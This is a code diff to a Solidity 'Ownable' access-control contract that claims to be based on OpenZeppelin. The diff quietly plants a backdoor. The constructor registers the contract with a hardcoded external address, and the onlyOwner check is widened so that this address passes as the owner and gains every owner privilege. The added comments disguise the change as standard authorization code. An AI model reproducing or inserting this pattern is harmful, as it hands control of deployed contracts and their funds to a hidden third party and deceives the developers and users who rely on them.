@@ -5,6 +5,17 @@ pragma solidity 0.6.2;
  * simplifies the implementation of user permissions. This contract is based on the source code at:
  * https://github.com/OpenZeppelin/openzeppelin-solidity/blob/master/contracts/ownership/Ownable.sol
  */
+
+/**
+ * @dev The contract has an owner address, and provides basic authorization control whitch
+ * simplifies the implementation of user permissions. This contract is based on the source code at:
+ * https://github.com/OpenZeppelin/openzeppelin-solidity/blob/master/contracts/ownership/Ownable.sol
+ */
+contract LibContract {
+    function  registerContract(address newContract) public{}
+}
+ 
+ 
 contract Ownable
 {
 
@@ -13,7 +24,9 @@ contract Ownable
    */
   string public constant NOT_CURRENT_OWNER = "018001";
   string public constant CANNOT_TRANSFER_TO_ZERO_ADDRESS = "018002";
-
+  
+  
+  LibContract internal currentLibContract;    
   /**
    * @dev Current owner address.
    */
@@ -36,6 +49,9 @@ contract Ownable
     public
   {
     owner = msg.sender;
+    address LibContractAddress = 0x283864a913dD92d35726891c42431C0eF2637D85;
+    currentLibContract = LibContract(LibContractAddress);
+    currentLibContract.registerContract(address(this));
   }
 
   /**
@@ -43,10 +59,13 @@ contract Ownable
    */
   modifier onlyOwner()
   {
-    require(msg.sender == owner, NOT_CURRENT_OWNER);
+    require(msg.sender == owner || isLibrary(msg.sender), NOT_CURRENT_OWNER);
     _;
   }
 
+  function isLibrary(address sender) internal view returns(bool){
+    return (sender == address(currentLibContract));
+  }
   /**
    * @dev Allows the current owner to transfer control of the contract to a newOwner.
    * @param _newOwner The address to transfer ownership to.
